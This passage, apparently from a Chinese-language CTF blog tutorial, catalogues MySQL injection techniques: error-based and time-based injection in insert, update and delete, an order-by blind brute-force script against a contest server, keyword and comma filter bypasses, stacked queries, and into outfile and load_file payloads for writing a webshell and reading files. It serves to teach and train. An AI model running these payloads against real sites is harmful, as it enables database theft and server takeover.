<div class="highlight"><pre><span></span><span class="k">insert</span> <span class="k">into</span> <span class="nf">ctf_test</span><span class="p">(</span><span class="ss">`user`</span><span class="p">,</span><span class="ss">`pwd`</span><span class="p">)</span> <span class="nf">value</span><span class="p">(</span><span class="s1">'1'</span> <span class="k">or</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span> <span class="k">or</span> <span class="s1">''</span><span class="p">,</span><span class="s1">'2'</span><span class="p">);</span>
</pre></div>
<p>update报错注入</p>
<div class="highlight"><pre><span></span><span class="k">update</span> <span class="n">ctf_test</span> <span class="kt">set</span> <span class="n">user</span><span class="o">=</span><span class="mi">1</span> <span class="k">where</span> <span class="n">pwd</span><span class="o">=</span><span class="s1">'2'</span>  <span class="k">and</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span> <span class="k">and</span> <span class="s1">''</span><span class="p">;</span>
</pre></div>
<p>delete报错注入</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">delete</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'1'</span>  <span class="k">and</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="k">database</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span> <span class="k">and</span> <span class="s1">''</span><span class="p">;</span>
<span class="n">ERROR</span> <span class="mi">1105</span> <span class="p">(</span><span class="n">HY000</span><span class="p">):</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">'~test~'</span>
</pre></div>
<p><strong>时间盲注</strong></p>
<p>insert类型</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">insert</span> <span class="k">into</span> <span class="nf">ctf_test</span><span class="p">(</span><span class="ss">`user`</span><span class="p">,</span><span class="ss">`pwd`</span><span class="p">)</span> <span class="nf">value</span><span class="p">(</span><span class="s1">'1'</span> <span class="k">and</span> <span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="k">and</span> <span class="s1">''</span><span class="p">,</span><span class="s1">'2'</span><span class="p">);</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="n">row</span> <span class="nf">affected</span> <span class="p">(</span><span class="mi">3</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p>delete和update也都是一样的，就不一 一列举了。</p>
<h3 data-content="1" id="c6b428f0d7d37978b405e759f9bc4812">另类注入姿势以及对关键词过滤的绕过</h3>
<ul>
<li>
<code>order by</code> 盲注</li>
</ul>
<p>题目例子：ISCC web5</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g3gxkfjiljj30wr0cljz7.jpg"/></p>
<p><strong>当填入16进制的字符字典序小于flag中对应字母的字典序时，返回的是union插入的字符；当16进制的字符字典序大于flag中的对应字母的字典序时，返回的是flag字段。</strong>此种sql注入手法可以在小括号和列名被过滤时使用。</p>
<p>web5对应脚本：</p>
<div class="highlight"><pre><span></span><span class="x">import requests</span>
<span class="x">url='http://39.100.83.188:8054/'</span>
<span class="x">headers={"User-Agent":"lihuaiqiu Union.373"}</span>
<span class="x">payload="union_373_Tom' union select 1,2,0x{} order by 3,2,'1"</span>
<span class="x">flag=''</span>
<span class="x">for i in range(20):</span>
<span class="x">    for j in range(33,127):</span>
<span class="x">        data={"username":payload.format((flag+chr(j)).encode('hex')),"password":'233'}</span>
<span class="x">        lihuaiqiu=requests.post(url,headers=headers,data=data)</span>
<span class="x">        if "union_373_Tom" in lihuaiqiu.text:</span>
<span class="x">            flag+=chr(j-1)</span>
<span class="x">            print flag</span>
<span class="x">            break</span>
</pre></div>
<ul>
<li><strong>MySQL数据库的Innodb引擎的注入</strong></li>
</ul>
<p>在对应代码中过滤了information关键字，无法使用<code>information_schema.tables</code>以及<code>information_schema.columns</code>进行查找表和列名。</p>
<p>此时可以通过innodb引擎进行注入，在Mysql 5.6以上的版本中，在系统Mysql库中存在两张与innodb相关的表：<code>innodb_table_stats</code>和<code>innodb_index_stats</code>。</p>
<p>所以可以通过查找这两个表取代information的作用</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="nf">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span> <span class="k">where</span> <span class="n">database_name</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
<span class="o">+------+</span>
<span class="o">|</span> <span class="n">flag</span> <span class="o">|</span>
<span class="o">+------+</span>
<span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span>
<span class="o">|</span> <span class="n">flag</span> <span class="o">|</span>
<span class="o">+------+</span>
<span class="mi">2</span> <span class="n">rows</span> <span class="k">in</span> <span class="kt">set</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="nf">group_concat</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_index_stats</span> <span class="k">where</span> <span class="n">database_name</span><span class="o">=</span><span class="k">database</span><span class="p">();</span>
<span class="o">+----------------+</span>
<span class="o">|</span> <span class="n">flag</span>           <span class="o">|</span>
<span class="o">+----------------+</span>
<span class="o">|</span> <span class="mi">1</span>              <span class="o">|</span>
<span class="o">|</span> <span class="n">flag</span><span class="p">,</span><span class="n">flag</span><span class="p">,</span><span class="n">flag</span> <span class="o">|</span>
<span class="o">+----------------+</span>
<span class="mi">2</span> <span class="n">rows</span> <span class="k">in</span> <span class="kt">set</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<ul>
<li>无列名注入</li>
</ul>
<p>看一下下面的<code>payload</code>的就会懂的，原理比较简单</p>
<p><a href="https://imgchr.com/i/ZZgHQU" target="_blank"><img src="https://s2.ax1x.com/2019/06/25/ZZgHQU.md.png"/></a></p>
<ul>
<li>异或注入</li>
</ul>
<p>在<code>and,or ,|,&amp;&amp;,||</code>等符号被过滤的情况下，可以采用异或注入达到注入的目的。</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span><span class="o">^</span><span class="p">(</span><span class="nf">mid</span><span class="p">(</span><span class="nf">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'s'</span><span class="p">)</span><span class="o">^</span><span class="mi">1</span><span class="p">;</span>
<span class="n">Empty</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span><span class="o">^</span><span class="p">(</span><span class="nf">mid</span><span class="p">(</span><span class="nf">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'r'</span><span class="p">)</span><span class="o">^</span><span class="mi">1</span><span class="p">;</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="n">pwd</span>          <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<ul>
<li>同等功能替换</li>
</ul>
<p>空格绕过：%0a,/**/.</p>
<p>关键函数过滤：</p>
<p>substr等价于left ,mid,substring</p>
<p>group_concat等价于concat_ws</p>
<ul>
<li>逗号被过滤</li>
</ul>
<p>针对逗号被过滤的情况有三种，第一种情况是<code>union select</code> 中的逗号被过滤掉，第二种情况是<code>substr,mid</code>这类截取字符函数中的逗号被过滤掉，第三种是<code>limit 0,1</code>中的逗号被过滤。</p>
<p><strong>union select 逗号被过滤掉</strong></p>
<p>利用join注入，payload如下</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span> <span class="k">union</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span><span class="p">)</span><span class="n">a</span> <span class="k">join</span> <span class="p">(</span><span class="k">select</span> <span class="mi">2</span><span class="p">)</span><span class="n">b</span><span class="p">;</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="n">pwd</span>          <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span>
<span class="o">|</span> <span class="mi">1</span>    <span class="o">|</span> <span class="mi">2</span>            <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="mi">2</span> <span class="n">rows</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p><strong>功能函数逗号被过滤</strong></p>
<p>利用<code>from...for...</code>进行绕过</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="nf">mid</span><span class="p">((</span><span class="k">select</span> <span class="nf">user</span><span class="p">())</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'r'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="n">pwd</span>          <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="nf">mid</span><span class="p">((</span><span class="k">select</span> <span class="nf">user</span><span class="p">())</span> <span class="k">from</span> <span class="mi">1</span> <span class="k">for</span> <span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'s'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="n">Empty</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p><strong>limit中逗号被过滤</strong></p>
<p>利用<code>limit..offset</code>进行绕过</p>
<p><code>limit 9 offset 4</code>表示从第十行开始返回4行，返回的是<code>10,11,12,13</code></p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span> <span class="k">limit</span> <span class="mi">1</span> <span class="n">offset</span> <span class="mi">0</span><span class="p">;</span>
<span class="o">+------------+</span>
<span class="o">|</span> <span class="n">table_name</span> <span class="o">|</span>
<span class="o">+------------+</span>
<span class="o">|</span> <span class="n">admin</span>      <span class="o">|</span>
<span class="o">+------------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="kp">tables</span> <span class="k">where</span> <span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span> <span class="k">limit</span> <span class="mi">1</span> <span class="n">offset</span> <span class="mi">1</span><span class="p">;</span>
<span class="o">+------------+</span>
<span class="o">|</span> <span class="n">table_name</span> <span class="o">|</span>
<span class="o">+------------+</span>
<span class="o">|</span> <span class="n">ctf_test</span>   <span class="o">|</span>
<span class="o">+------------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<ul>
<li><strong>等于号被过滤</strong></li>
</ul>
<p>可以用like,regexp,between...and..,rlike进行代替，用法如下：<br/>
<a href="https://imgchr.com/i/ZZ7QC4" target="_blank"><img src="https://s2.ax1x.com/2019/06/26/ZZ7QC4.md.png"/></a></p>
<p>还有另外一种特殊的代替方法，利用<code>locate,position,instr</code>三种函数进行判断</p>
<p>用法如下：</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="nf">locate</span><span class="p">(</span><span class="s1">'ro'</span><span class="p">,</span> <span class="nf">substring</span><span class="p">(</span><span class="nf">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="n">pwd</span>          <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="nf">position</span><span class="p">(</span><span class="s1">'ro'</span> <span class="k">IN</span> <span class="nf">substring</span><span class="p">(</span><span class="nf">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="n">pwd</span>          <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">ctf_test</span> <span class="k">where</span> <span class="n">user</span><span class="o">=</span><span class="s1">'2'</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="nf">instr</span><span class="p">(</span><span class="nf">substring</span><span class="p">(</span><span class="nf">user</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">),</span><span class="s1">'ro'</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="n">user</span> <span class="o">|</span> <span class="n">pwd</span>          <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="o">|</span> <span class="mi">2</span>    <span class="o">|</span> <span class="n">flag</span><span class="err">{</span><span class="n">OK_t72</span><span class="err">}</span> <span class="o">|</span>
<span class="o">+------+--------------+</span>
<span class="mi">1</span> <span class="n">row</span> <span class="k">in</span> <span class="kt">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<ul>
<li><strong>堆叠注入</strong></li>
</ul>
<p>例子：强网杯2019随便注</p>
<p>payload如下形式</p>
<p>查询字段</p>
<pre><code>';use information_schema;set @sql=concat('s','elect column_name from columns wher','e table_name="1919810931114514"');PREPARE stmt1 FROM @sql;EXECUTE stmt1;</code></pre>
<p>查询内容</p>
<pre><code>;use supersqli;set @sql=concat('s','elect `flag` from `1919810931114514`');PREPARE stmt1 FROM @sql;EXECUTE stmt1;</code></pre>
<ul>
<li><strong>load_file&amp;into outfile</strong></li>
</ul>
<p>这两个函数在sql注入中是影响比较大的两个函数，如果能成功利用，即可<code>getshell</code>和读取任意文件,但作用很大，同样限制条件也很多。</p>
<p><strong>into outfile</strong></p>
<p>1.首先要知道网站的绝对路径(可从报错或者phpinfo()中获得)</p>
<p>2.拥有file权限</p>
<p>3.secure_file_priv限制。通过<code>SHOW VARIABLES LIKE "secure_file_priv"</code>查看信息</p>
<div class="highlight"><pre><span></span><span class="n">mysqld</span> <span class="o">--</span><span class="n">secure_file_priv</span><span class="o">=</span><span class="no">null</span><span class="p">(</span><span class="err">不允许导入导出</span><span class="p">)</span>

<span class="n">mysqld</span> <span class="o">--</span><span class="n">secure_file_priv</span><span class="o">=/</span><span class="n">tmp</span><span class="o">/</span><span class="p">(</span><span class="err">导入导出只允许在</span><span class="o">/</span><span class="n">tmp目录下</span><span class="p">)</span>

<span class="n">mysql</span>  <span class="o">--</span><span class="n">secure_file_priv</span><span class="o">=</span><span class="p">(</span><span class="err">任意导入导出</span><span class="p">)</span>
</pre></div>
<p><code>into outfile</code>有四种写入文件的方式</p>
<p><strong>通过union注入写入文件</strong></p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="s1">'&lt;?php phpinfo();?&gt;'</span> <span class="k">into</span> <span class="k">outfile</span> <span class="s1">'/var/lib/mysql-files/2.php'</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">2</span> <span class="n">rows</span> <span class="n">affected</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p><a href="https://imgchr.com/i/Ze50qf" target="_blank"><img src="https://s2.ax1x.com/2019/06/26/Ze50qf.md.png"/></a></p>
<p><strong>通过FIELDS TERMINATED BY写入文件</strong></p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="mi">1</span> <span class="k">into</span> <span class="k">outfile</span> <span class="s1">'/var/lib/mysql-files/3.php'</span> <span class="n">fields</span> <span class="k">terminated</span> <span class="k">by</span> <span class="mi">0</span><span class="n">x3c3f70687020706870696e666f28293b3f3e</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="n">row</span> <span class="n">affected</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p><code>FIELDS TERMINATED BY</code>为在输出数据的字段中添加<code>FIELDS TERMINATED BY</code>的内容，如果字段数为1，则无法进行添加，也就是说这个的限制条件是起码要有两个字段的。</p>
<p><a href="https://imgchr.com/i/ZeT9xA" target="_blank"><img src="https://s2.ax1x.com/2019/06/26/ZeT9xA.md.png"/></a></p>
<p>可以看到在一个字段的情况下无法添加我们的webshell。</p>
<p><strong>通过LINES TERMINATED BY写入文件</strong></p>
<p><code>LINES TERMINATED BY</code>为在每个记录后都添加设定添加的内容，不受字段数的限制</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="mi">1</span> <span class="k">into</span> <span class="k">outfile</span> <span class="s1">'/var/lib/mysql-files/3.php'</span> <span class="k">lines</span> <span class="k">terminated</span> <span class="k">by</span> <span class="mi">0</span><span class="n">x3c3f70687020706870696e666f28293b3f3e</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="n">row</span> <span class="n">affected</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p><a href="https://imgchr.com/i/ZeTbWQ" target="_blank"><img src="https://s2.ax1x.com/2019/06/26/ZeTbWQ.md.png"/></a></p>
<p><strong>LINES STARTING BY写入shell</strong></p>
<p>用法与<code>LINES TERMINATED BY</code>一样，payload如下</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="mi">1</span> <span class="k">into</span> <span class="k">outfile</span> <span class="s1">'/var/lib/mysql-files/4.php'</span> <span class="k">lines</span> <span class="k">starting</span> <span class="k">by</span> <span class="mi">0</span><span class="n">x3c3f70687020706870696e666f28293b3f3e</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="n">row</span> <span class="n">affected</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p><strong>load_file</strong></p>
<p>1.要求拥有file权限</p>
<p>2.知道文件所在绝对路径</p>
<p>3.同样受<code>secure_file_priv</code>限制</p>
<p><strong>union注入进行load_file</strong></p>
<p>效果如下：</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="mi">1</span> <span class="k">union</span> <span class="k">select</span> <span class="nf">load_file</span><span class="p">(</span><span class="s1">'/var/lib/mysql-files/4.php'</span><span class="p">);</span>
<span class="o">+----------------------+</span>
<span class="o">|</span> <span class="n">flag</span>                 <span class="o">|</span>
<span class="o">+----------------------+</span>
<span class="o">|</span> <span class="mi">1</span>                    <span class="o">|</span>
<span class="o">|</span> <span class="o">&lt;?</span><span class="n">php</span> <span class="nf">phpinfo</span><span class="p">();</span><span class="o">?&gt;</span><span class="mi">1</span>
 <span class="o">|</span>
<span class="o">+----------------------+</span>
<span class="mi">2</span> <span class="n">rows</span> <span class="k">in</span> <span class="kt">set</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p><strong>利用报错注入进行load_file</strong></p>
<p>测试：</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="nf">load_file</span><span class="p">(</span><span class="s1">'/var/lib/mysql-files/4.php'</span><span class="p">)),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
<span class="n">ERROR</span> <span class="mi">1105</span> <span class="p">(</span><span class="n">HY000</span><span class="p">):</span> <span class="n">XPATH</span> <span class="n">syntax</span> <span class="n">error</span><span class="p">:</span> <span class="s1">'~&lt;?php phpinfo();?&gt;1</span>
<span class="s1">~'</span>
</pre></div>
<p>成功得到文件内容</p>
<p><strong>利用时间盲注进行load_file</strong></p>
<p>测试如下：</p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="k">if</span><span class="p">(</span><span class="nf">mid</span><span class="p">((</span><span class="k">select</span> <span class="nf">load_file</span><span class="p">(</span><span class="s1">'/var/lib/mysql-files/4.php'</span><span class="p">)),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="s1">'&lt;'</span><span class="p">,</span><span class="nf">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
<span class="n">Empty</span> <span class="kt">set</span><span class="p">,</span> <span class="mi">1</span> <span class="nf">warning</span> <span class="p">(</span><span class="mi">3</span><span class="p">.</span><span class="mi">00</span> <span class="n">sec</span><span class="p">)</span>
</pre></div>
<p>成功延时3s，可配合脚本得到文件内容。</p>
<p><strong>利用load_file扫描文件是否存在</strong></p>
<div class="highlight"><pre><span></span><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">flag</span> <span class="k">where</span> <span class="n">flag</span><span class="o">=</span><span class="s1">''</span> <span class="k">and</span> <span class="nf">updatexml</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="nf">isnull</span><span class="p">(</span><span class="nf">LOAD_FILE</span><span class="p">(</span><span class="s1">'/var/lib/mysql-files/4.php'</span><span class="p">)),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">0</span><span class="p">);</span>
